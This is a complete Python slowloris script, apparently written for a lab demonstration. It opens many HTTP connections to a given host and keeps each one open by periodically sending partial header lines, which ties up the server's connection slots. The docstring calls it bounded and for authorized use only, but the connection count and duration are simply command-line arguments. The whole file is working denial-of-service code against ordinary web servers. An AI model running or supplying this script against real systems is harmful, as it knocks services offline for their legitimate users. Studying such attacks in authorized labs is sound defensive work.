#!/usr/bin/env python3
"""Minimal slowloris for a lab demo: hold N HTTP connections open by dribbling
header lines slowly, so the server never sees a complete request. Bounded by a
fixed socket count and duration — this is a demonstration, not a stress tool.

    python3 slowloris.py <host> <port> [connections=40] [duration_s=60]

Authorized-use only: aim it at a host you own / are authorized to test.
"""
import random
import socket
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])
n = int(sys.argv[3]) if len(sys.argv) > 3 else 40
duration = float(sys.argv[4]) if len(sys.argv) > 4 else 60

socks = []
for _ in range(n):
    try:
        s = socket.create_connection((host, port), timeout=4)
        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        s.send(b"User-Agent: lab-slowloris\r\nAccept-language: en-US\r\n")
        socks.append(s)
    except OSError:
        pass
print(f"opened {len(socks)} connections", flush=True)

end = time.time() + duration
while time.time() < end and socks:
    for s in list(socks):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
        except OSError:
            socks.remove(s)
    time.sleep(8)
print(f"kept {len(socks)} open to the end", flush=True)
for s in socks:
    s.close()
